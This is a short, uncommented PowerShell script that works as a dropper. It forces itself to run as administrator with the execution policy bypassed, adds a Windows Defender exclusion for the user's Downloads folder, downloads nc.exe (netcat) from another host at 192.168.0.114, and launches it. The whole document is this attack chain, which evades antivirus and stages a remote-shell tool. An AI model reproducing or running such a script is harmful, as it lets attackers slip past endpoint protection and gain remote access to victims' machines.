function Ensure-Elevated {
    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $script = $MyInvocation.MyCommand.Definition
        $arguments = "-ExecutionPolicy Bypass -File `"$script`""
        Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments
        exit
    }
}

function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
        exit
    }
}

Ensure-Elevated
Ensure-WindowsPowerShell

try {
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue

    $url = 'http://192.168.0.114/nc.exe'
    $outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'nc.exe')

    Start-Sleep -Milliseconds 100

    Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing

    Start-Process -FilePath $outputFile
}
catch {
    Write-Error "Execution failed: $_"
}
